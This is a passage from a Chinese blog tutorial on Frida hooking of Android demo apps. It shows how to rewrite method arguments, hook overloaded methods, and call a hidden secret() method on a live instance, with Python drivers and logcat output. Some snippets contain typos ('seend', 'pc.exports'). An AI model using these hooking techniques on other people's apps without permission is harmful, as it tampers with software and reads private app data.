class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PID  Name</span><br><span class="line">----  -------------------------------</span><br><span class="line"> 261  adbd</span><br><span class="line">1008  android.process.media</span><br><span class="line">1656  com.android.defcontainer</span><br><span class="line">4026  com.android.documentsui</span><br><span class="line">4053  com.android.externalstorage</span><br><span class="line">1759  com.android.gallery3d</span><br><span class="line">1383  com.android.keychain</span><br><span class="line">1718  com.android.phone</span><br><span class="line">1791  com.android.settings</span><br><span class="line">1690  com.android.settings:superuser</span><br><span class="line">4081  com.android.shell</span><br><span class="line"> 743  com.android.systemui</span><br><span class="line"> 824  com.tencent.mm</span><br><span class="line">1140  com.tencent.mm:push</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><p>先查看手册<a href="https://frida.re/docs/javascript-api/" target="_blank" rel="noopener">英文原版</a> <a href="https://zhuanlan.kanxue.com/article-342.htm" target="_blank" rel="noopener">中文版上</a><a href="https://zhuanlan.kanxue.com/article-414.htm" target="_blank" rel="noopener">中文版下</a></p><p>roysue大佬写了详细的教程</p><h3 id="1-hook参数修改结果"><a href="#1-hook参数修改结果" class="headerlink" title="1. hook参数修改结果"></a>1. hook参数修改结果</h3><p>例子<a href="https://github.com/11x256/frida-android-examples/tree/master/examples/1" target="_blank" rel="noopener">下载地址</a></p><p>先安装apk，然后启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//apk主要代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">my_activity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_my_activity);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;       <span class="comment">//无限循环</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Sum"</span> , String.valueOf(x+y));   <span class="comment">//打印x+y的值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用adb命令查看程序启动时打印的x+y的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01-21 22:28:04.489  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:05.523  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:06.614  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:07.615  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:08.617  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:09.618  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:10.619  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:11.619  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:12.620  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:13.630  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:14.639  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:15.639  4910  4910 D Sum     : 80</span><br></pre></td></tr></table></figure><p>按照官方的手册写一段劫持的js代码,命名为demo1.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Script loaded successfully "</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123; <span class="comment">//Java.perform(fn): ensure that the current thread is attached to the VM and call fn</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Inside java perform function"</span>);</span><br><span class="line">    <span class="comment">//添加要劫持的类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = Java.use(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>);</span><br><span class="line">    <span class="comment">//重写函数</span></span><br><span class="line">    my_class.fun.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//打印函数原来的值</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"original call: fun("</span> + x + <span class="string">", "</span> + y + <span class="string">")"</span>);</span><br><span class="line">        <span class="comment">//使用2，5代替x,y返回参数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"now call: fun(2, 5)"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用python调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./demo1.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile:   <span class="comment">#读取刚才写的js的内容</span></span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()  //获取usb设备</span><br><span class="line">pid = device.spawn(<span class="string">"com.example.a11x256.frida_test"</span>)   <span class="comment">#注入apk</span></span><br><span class="line">device.resume(pid)      </span><br><span class="line">time.sleep(<span class="number">1</span>)     <span class="comment">#休眠1秒，如无此操作，部分类可能无法hook</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(jscode)   <span class="comment">#创建脚本</span></span><br><span class="line">script.load()     <span class="comment">#加载脚本</span></span><br><span class="line"></span><br><span class="line">sys.stdin.read()  <span class="comment">#持续查看输入</span></span><br></pre></td></tr></table></figure><p> 当执行此脚本时，观察logcat打印的信息，发现不是打印80而是改成7了。</p><p>当脚本执行时</p><p><img src="/pic/demo1.png" alt=""></p><p><img src="/pic/demo1_stop.png" alt=""></p><h3 id="2-劫持重载函数，主动调用"><a href="#2-劫持重载函数，主动调用" class="headerlink" title="2. 劫持重载函数，主动调用"></a>2. 劫持重载函数，主动调用</h3><p>例子<a href="https://github.com/11x256/frida-android-examples/tree/master/examples/2" target="_blank" rel="noopener">下载链接</a></p><p>同样先安装apk，然后打开<br>主要代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.a11x256.frida_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">my_activity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String total = <span class="string">"@@@###@@@"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_my_activity);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">            Log.d(<span class="string">"string"</span> , fun(<span class="string">"LoWeRcAsE Me!!!!!!!!!"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Log.d(<span class="string">"Sum"</span> , String.valueOf(x+y));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">fun</span><span class="params">(String x)</span></span>&#123;</span><br><span class="line">        total +=x;</span><br><span class="line">        <span class="keyword">return</span> x.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">String <span class="title">secret</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与例子一比较，多了2个地方，一个fun的重载函数和一个secret函数。</p><p>启动app后使用logcat查看打印的日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">01-22 01:54:11.019  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:11.019  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:12.020  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:12.020  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:13.030  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:13.030  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:14.037  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:14.037  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:15.038  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:15.038  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:16.040  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:16.040  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:17.045  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:17.045  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:18.049  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:18.049  5264  5264 D string  : lowercase me!!!!!!!!!</span><br><span class="line">01-22 01:54:19.055  5264  5264 D Sum     : 80</span><br><span class="line">01-22 01:54:19.055  5264  5264 D string  : lowercase me!!!!!!!!!</span><br></pre></td></tr></table></figure><p>重载函数需要加一个overload来处理，参数为String类的时候，由于String类不是Java基本数据类型，而是java.lang.String类型，所以在替换参数的构造上，需要使用java.lang.String类。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my_class.fun.overload(<span class="string">"int"</span> , <span class="string">"int"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">my_class.fun.overload(<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br></pre></td></tr></table></figure><p>js脚本就变成了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Inside java perform function"</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> my_class= Java.use(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>)</span><br><span class="line">    <span class="keyword">var</span> string_class = Java.use(<span class="string">"java.lang.String"</span>);   <span class="comment">//参数为String类的时候，由于String类不是Java基本数据类型，而是java.lang.String类型，所以在替换参数的构造上，需要使用java.lang.String类</span></span><br><span class="line">  </span><br><span class="line">    my_class.fun.overload(<span class="string">"java.lang.String"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="comment">//print the original arguments</span></span><br><span class="line">        <span class="keyword">var</span> my_string = string_class.$<span class="keyword">new</span>(<span class="string">"MYSTRINGS"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"original call: fun("</span> + <span class="keyword">this</span>.fun(x)+<span class="string">")"</span>);        <span class="comment">//调用原函数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(my_string);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"modefied strings is :"</span> + my_string);  </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="keyword">return</span> ret_value;  <span class="comment">//返回修改后的值MYSTRINGS</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     my_class.fun.overload(<span class="string">"int"</span>,<span class="string">"int"</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x,y</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"original call: fun("</span> +x+<span class="string">","</span>+y+<span class="string">")"</span>); <span class="comment">//打印原来的参数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(x,<span class="number">45</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"modefied args is :"</span> + x+<span class="string">",45"</span> );</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"****************"</span>)</span><br><span class="line">        <span class="keyword">return</span> ret_value;  <span class="comment">//返回修改后的值X+45</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在此处再加一个python的消息处理接受函数，使用script.on()调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    <span class="keyword">if</span> message['type'] </span>== <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br></pre></td></tr></table></figure><p>完整的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, frida, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span>   <span class="comment">#消息处理</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./demo2.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile: <span class="comment">#读取js文件的内容</span></span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()   <span class="comment">#使用usb设备</span></span><br><span class="line">pid = device.spawn(<span class="string">"com.example.a11x256.frida_test"</span>)   <span class="comment">#使用spwan模式</span></span><br><span class="line">device.resume(pid)  </span><br><span class="line">time.sleep(<span class="number">1</span>)   <span class="comment">#休眠一秒</span></span><br><span class="line">session = device.attach(pid)   </span><br><span class="line">script = session.create_script(jscode)   <span class="comment">#创建脚本  </span></span><br><span class="line">script.on(<span class="string">"message"</span>, on_message)   <span class="comment">#消息处理</span></span><br><span class="line">script.load()    <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>启动脚本，并且查看logcat的日志输出的日志变成了劫持后的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">01-22 01:56:36.312  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:36.323  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:37.324  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:37.328  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:38.328  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:38.329  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:39.329  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:39.330  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:40.331  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:40.332  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:41.332  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:41.333  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:42.334  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:42.335  5291  5291 D string  : mystrings</span><br><span class="line">01-22 01:56:43.336  5291  5291 D Sum     : 95</span><br><span class="line">01-22 01:56:43.337  5291  5291 D string  : mystrings</span><br></pre></td></tr></table></figure><h3 id="3-主动调用，远程调用"><a href="#3-主动调用，远程调用" class="headerlink" title="3. 主动调用，远程调用"></a>3. 主动调用，远程调用</h3><p>此时还有一个sercet函数没有调用。想要调用可以搜索内存中的此函数并进行调用。搜索函数使用Java.choose</p><blockquote><p>关于Java.use和Java.choose的</p><p><strong>Java.use(fn):</strong> 把当前线程附加到Java VM环境中去，并且执行Java函数fn（如果已经在Java函数的回调中，则不需要再附加到VM）</p><p><strong>Java.choose(className, callbacks):</strong> 在Java的内存堆上扫描指定类名称的Java对象，每次扫描到一个对象，则回调<strong>callbacks</strong>:</p><ul><li><strong>onMatch: function(instance):</strong> 每次扫描到一个实例对象，调用一次，函数返回<strong>stop</strong>结束扫描的过程</li><li><strong>onComplete: function():</strong> 当所有的对象都扫描完毕之后进行回调</li></ul></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Script loaded successfully "</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Inside java perform function"</span>);</span><br><span class="line"></span><br><span class="line">    Java.choose(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>, &#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;    <span class="comment">//在内存上搜索class的实例</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Found instance: "</span> + instance);     <span class="comment">//搜索到后打印</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Result of secret func: "</span> + instance.secret());   <span class="comment">//调用隐藏方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, frida, time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'seend'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./demo2.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile:</span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn(<span class="string">"com.example.a11x256.frida_test"</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line">script.on(<span class="string">"message"</span>, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><p>python的输出结果为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Script loaded successfully </span><br><span class="line">Inside java perform <span class="keyword">function</span></span><br><span class="line">Found instance: com.example.a11x256.frida_test.my_activity@e0b1cfc</span><br><span class="line">Result of secret func: @@@<span class="comment">###@@@LoWeRcAsE Me!!!!!!!!!</span></span><br><span class="line">end...</span><br><span class="line"></span><br><span class="line">Process finished with <span class="built_in">exit</span> code 0</span><br></pre></td></tr></table></figure><p>这么写只能调用一次，现在需要调用很多次时候。rpc.exports登场</p><blockquote><p><strong>rpc.exports:</strong> 可以在你的程序中导出一些 <strong>RPC-Style</strong> API函数，Key指定导出的名称，Value指定导出的函数，函数可以直接返回一个值，也可以是异步方式以 <strong>Promise</strong> 的方式返回</p></blockquote><p>对上面的代码用一个函数包起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Secret</span>(<span class="params"></span>) </span>&#123;   <span class="comment">//Defining the function that will be exported</span></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;    <span class="comment">//code that calls `secret` function from the previous example</span></span><br><span class="line">        Java.choose(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"Found instance: "</span> + instance);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"Result of secret func: "</span> + instance.secret());</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pc.exports = &#123;</span><br><span class="line">  secret:Secret  <span class="comment">//使用secret函数名称代替Secret函数名，不能有大写字母下划线。在处理的时候会被转化成小写，下划线会被去掉</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,time</span><br><span class="line"></span><br><span 